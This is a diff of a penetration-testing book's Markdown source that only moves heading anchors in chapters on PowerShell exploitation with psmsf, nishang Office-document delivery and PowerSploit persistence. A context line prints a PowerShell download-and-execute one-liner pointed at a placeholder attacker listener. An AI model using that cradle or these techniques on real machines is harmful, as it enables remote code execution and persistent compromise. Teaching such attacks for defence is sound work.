@@ -284,8 +284,8 @@ You can find the video of how this attack is played out at [https://youtu.be/a01
 
 If you do not already have `psmsf` on your attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
 
-{icon=bomb} {#powershell-exploitation-with-psmsf-play}
-G> ## The Play
+{icon=bomb}
+G> ## The Play {#powershell-exploitation-with-psmsf-play}
 G>
 G> Go ahead and run `python psmsf`, you will be provided with the details you need to take the next steps.
 G>
@@ -590,8 +590,8 @@ You can find the video of how this attack is played out at []().
 
 If you do not already have `nishang` on your Windows attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
 
-{icon=bomb} {#powershell-exploitation-via-office-documents}
-G> ## The Play
+{icon=bomb}
+G> ## The Play {#powershell-exploitation-via-office-documents}
 G>
 G> Follow the directions from the [Powershell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play from above, but just swap out the section where we created the c virus and replace with the following:
 G>
@@ -663,7 +663,7 @@ G>
 
 #### Adding Persistence C/- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/) {#vps-identify-risks-adding-persistence-co-powersploit}
 
-We can do better than `meterpreter`. PowerSploit has a module called [Persistence](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1), and that is what we use in this play. This adds persistence to the PowerShell one liner that was embedded in the `psmsf` virus we created [above](#download-psmsf-payload-execute), namely [`download-payload-execute`](#download-psmsf-payload-execute), and also used in the office document [attack with `nishang`](#powershell-exploitation-via-office-documents). The one liner was:
+We can do better than `meterpreter`. PowerSploit has a module called [Persistence](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1), and that is what we use in this play. This adds persistence to the PowerShell one liner that was embedded in the `psmsf` virus we created above, namely [`download-payload-execute`](#download-psmsf-payload-execute), and also used in the office document [attack with `nishang`](#powershell-exploitation-via-office-documents). The one liner was:
 
 {title="persistentFetchRunPayload.ps1", linenos=off, id="persistentFetchRunPayload-ps1", lang=PowerShell}
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))
